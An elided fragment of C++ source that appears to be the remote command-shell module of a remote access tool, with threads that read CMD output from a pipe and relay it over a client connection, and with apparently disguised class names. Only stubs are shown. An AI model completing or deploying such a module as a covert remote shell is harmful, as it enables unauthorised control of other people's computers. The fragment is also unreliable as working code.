...
CSELM::CSELM(privatra*pClient):Cprotm(pClient)
{
...
void CSELM::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
...
//读取CMD的输出数据线程函数
DWORD WINAPI CSELM::ReadPipeThread(LPVOID lparam)
{
	unsigned long   BytesRead = 0;
	unsigned long   BytesReads = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	CSELM*pThis = (CSELM*)lparam;
	while (1)
	{
		Sleep(100);
...
//等待结束，清理线程关闭链接
DWORD WINAPI CSELM::MonitorThread(LPVOID lparam)
{
	CSELM*pThis = (CSELM*)lparam;
	HANDLE hThread[2];
